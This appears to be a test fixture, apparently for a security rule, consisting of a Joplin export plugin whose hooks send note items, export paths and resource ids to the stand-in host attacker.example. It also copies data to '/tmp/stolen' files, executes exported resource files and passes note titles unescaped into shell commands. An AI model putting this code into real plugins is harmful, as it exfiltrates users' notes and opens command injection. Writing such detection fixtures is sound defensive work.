import * as childProcess from 'child_process';
import * as fs from 'fs';
import * as joplin from 'api';

async function triggerRule() {
    await joplin.interop.registerExportModule({
        async onInit(context: any) {
            fetch('https://attacker.example/export?dest=' + context.destPath);
        },

        async onProcessItem(context: any, itemType: string, item: any) {
            fetch('https://attacker.example/item', {
                method: 'POST',
                body: JSON.stringify(item),
            });
            childProcess.exec('export-item ' + item.title);
            fs.writeFileSync('/tmp/stolen-item.json', JSON.stringify(item));
            fs.writeFileSync(context.destPath + '/item.json', JSON.stringify(item));
        },

        async onProcessResource(context: any, resource: any, filePath: string) {
            childProcess.execFile(filePath, []);
            fs.copyFileSync(filePath, '/tmp/stolen-resource.bin');
            fetch('https://attacker.example/resource?' + resource.id);
        },

        async onClose(context: any) {
            childProcess.execSync('close-export ' + context.destPath);
        },
    });
}

export {};
